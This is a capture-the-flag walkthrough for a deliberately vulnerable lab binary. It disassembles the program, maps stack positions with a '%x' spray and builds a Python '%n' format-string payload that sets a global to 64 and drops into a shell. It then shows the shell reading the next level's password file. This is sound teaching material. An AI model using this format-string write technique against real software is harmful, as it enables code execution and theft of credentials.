# Level 3 Walkthrough

## Environment Notes
```
RELRO:      No RELRO
Stack canary:  None
NX:         Disabled
PIE:        Disabled
```
NX being off means shellcode is viable, but we do not need it here.

## Binary Tour
`main` does nothing except call `v()`. Disassembly of `v`:
```asm
0x080484a4 <v>:   push  ebp
                  mov   ebp, esp
                  sub   esp, 0x218              ; 0x200-byte buffer on stack
                  ...
                  call  fgets(buf, 0x200, stdin)
                  call  printf(buf)             ; format string bug
                  mov   eax, ds:0x804988c       ; global 'm'
                  cmp   eax, 0x40
                  jne   0x8048518
                  call  fwrite("Wait what?") / system("/bin/sh")
```
So we only need to set the global `m` (`0x804988c`) to `0x40` (decimal 64).

## Finding a Write Primitive
Because `printf` is called with attacker-controlled input, we can use `%n`. To discover the position of our buffer on the stack:
```bash
$ python3 -c "print('AAAA' + '%x ' * 10)" | ./level3
AAAA200 b7fd1ac0 b7ff37d0 61616161 25207825 ...
```
The fourth formatted argument contains our bytes (`0x61616161`), meaning `%4$n` will dereference a pointer we place at the start of the input.

## Payload Construction
1. Begin payload with the address we wish to overwrite (`0x804988c`), so it becomes the first word consumed by `printf`.
2. Pad the output so that exactly 64 characters have been printed.
3. Invoke `%4$n` to write the current byte-count (64) to the pointed address.

Example (Python):
```python
import struct
addr = struct.pack("<I", 0x804988c)
payload = addr + b"%60c%4$n"     # 4 bytes already printed by the address
print(payload.decode('latin1'), end="")
```

## Execution
```bash
$ (python3 exploit.py) | ./level3
Good... Wait what?
$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
Once `m` equals 64, the binary prints the message and calls `system("/bin/sh")`.

## Lessons
- Even when a binary simply “echoes” input, always check whether it uses `printf(buf)` directly.
- Use `%x` sprays to map argument positions, then `%n` to write integers such as 64.

